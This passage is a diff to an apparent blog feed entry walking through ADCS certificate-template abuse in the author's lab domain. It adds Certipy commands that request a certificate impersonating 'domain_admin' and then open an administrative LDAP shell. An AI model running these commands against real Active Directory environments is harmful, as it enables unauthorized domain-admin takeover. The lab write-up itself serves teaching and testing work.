@@ -45,10 +45,21 @@ more specifically, if a template allows a standard domain user or domain compute
 <blockquote>
 <p>python3 entry.py find -u &ldquo;<a href="mailto:joshua@CXLABS.LOCAL">joshua@CXLABS.LOCAL</a>&rdquo; -p &ldquo;REDACTED&rdquo; -dc-ip &ldquo;192.168.197.129&rdquo; -stdout -scheme ldap</p>
 </blockquote>
-<p>using the find module of certipy to enumerate all ADCS templates, where -u and -p are the credentials for the domain account and the DC-IP is the CA.</p>
+<p>this uses the find module of certipy to enumerate all ADCS templates, where -u and -p are the credentials for the domain account and the DC-IP is the CA.</p>
 <p>it&rsquo;s important to note that certipy uses LDAPS by default, in my messy DC deployment i have not issued any certs for LDAPS authentication, so i&rsquo;ve opted to use plain old ldap.</p>
 <p>output from command:</p>
 <p><img src="/VulnTemplate.png" alt="VulnTemplate"></p>
+<p>so straight away you can see we&rsquo;ve found a template vulnerable, next we can leverage this template and request a certificate with the SAN being &ldquo;domain_admin&rdquo; with the payload looking a little something like this:</p>
+<blockquote>
+<p>python3 entry.py req -u <a href="mailto:joshua@cxlabs.local">joshua@cxlabs.local</a> -p REDACTED -target 192.168.197.129 -template VulnTemplate -ca &ldquo;CXLABS-CXLABS-DC-01-CA&rdquo; -upn &ldquo;<a href="mailto:domain_admin@cxlabs.local">domain_admin@cxlabs.local</a>&rdquo;</p>
+</blockquote>
+<p><img src="/POC.png" alt="POC"></p>
+<p>as you can see we have successfully managed to receive a .PFX certificate that allows us to impersonate a domain admin.</p>
+<p>we can now use this to open up an administrative LDAP shell using the below payload:</p>
+<blockquote>
+<p>python3 auth -pfx domain_admin.pfx -dc-ip 192.168.197.129 -ldap-shell -debug</p>
+</blockquote>
+<p><img src="/pwnd.png" alt="pwnd"></p>
 ]]></content>
         </item>
         
